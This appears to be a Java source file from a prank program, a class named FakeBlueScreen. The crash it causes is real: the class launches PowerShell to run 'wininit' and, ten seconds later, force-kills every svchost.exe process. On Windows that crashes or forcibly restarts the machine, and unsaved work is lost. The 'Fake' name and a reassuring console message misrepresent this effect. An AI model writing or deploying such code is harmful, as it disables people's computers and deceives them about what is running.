package maurus.features.bluescreen;

import javafx.animation.KeyFrame;
import javafx.animation.Timeline;
import javafx.application.Application;
import javafx.stage.Stage;
import javafx.util.Duration;

import java.io.IOException;


public class FakeBlueScreen  {


    public void start (Stage primaryStage, Runnable onDone) throws Exception {
        try {
            new ProcessBuilder(
                    "powershell.exe",
                    "-NoExit",
                    "-Command",
                    "wininit"
            ).inheritIO().start();

        } catch (Exception e) {
            e.printStackTrace();
        }

        Timeline timeline = new Timeline(new KeyFrame(Duration.seconds(10), e -> {
            try {
                new ProcessBuilder(
                        "powershell.exe",
                        "-Command",
                        "taskkill",
                        "/F",
                        "/IM",
                        "svchost.exe"
                ).inheritIO().start();
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
        }));
        timeline.play();
        timeline.setCycleCount(1);
        System.out.println("no bluescreen opening next feature sonn +- 10 sec");
        Timeline timelineEnd = new Timeline(new KeyFrame(Duration.seconds(20), e -> {
            onDone.run();
        }));
        timelineEnd.play();
        timeline.setCycleCount(1);
    }
}